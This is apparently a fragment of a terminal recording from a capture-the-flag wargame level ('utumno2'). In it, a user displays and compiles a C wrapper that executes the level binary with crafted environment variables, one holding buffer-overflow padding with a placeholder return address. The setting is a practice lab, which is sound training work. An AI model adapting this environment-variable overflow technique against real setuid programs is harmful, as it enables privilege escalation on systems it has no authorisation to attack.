[0.315, "o", "cat w.c\r\r\n\u001b[?2004l\r\u001b]3008;start=22d70308-5a29-44ac-9b2e-512954023147;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\#include <unistd.h>\r\r\n#include <stdio.h>\r\r\n\r\r\nint main(void)\r\r\n{\r\r\n    char *argv[] = { \"\", NULL };\r\r\n    char *env[12];\r\r\n    char b8[64], b9[64];\r\r\n    int i;\r\r\n\r\r\n    for (i = 0; i < 8; i++) { sprintf(b8, \"E%02d=AAAA\", i); env[i] = b8; }\r\r\n    sprintf(b8, \"E08=%s\", \"AAAAAAAAAAAABBBB\\x41\\x41\\x41\\x41\");\r\r\n    env[8] = b8;\r\r\n    for (i = 9; i < 11; i++) { sprintf(b9, \"E%02d=AAAA\", i); env[i] = b9; }\r\r\n    env[11] = NULL;\r\r\n\r\r\n    execve(\"/utumno/utumno2\", argv, env);\r\r\n    return 1;\r\r\n}\r\r\n\r\r\n\u001b]3008;end=22d70308-5a29-44ac-9b2e-512954023147;exit=success\u001b\\\u001b]3008;start=ffd8730a-49e2-4b4e-b486-6a93cd0caf30;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\\u001b[?2004h\u001b]0;utumno2@utumno: /tmp/uu2\u0007utumno2@utumno:/tmp/uu2$ gcc -m32 -o w w.c\r\r\n\u001b[?2004l\r\u001b]3008;start=1723b779-1d89-4270-b501-8e06d476bbad;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\\u001b]3008;end=1723b779-1d89-4270-b501-8e06d476bbad;exit=success\u001b\\\u001b]3008;start=ffd8730a-49e2-4b4e-b486-6a93cd0caf30;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/uu2\u001b\\\u001b[?2004h"]
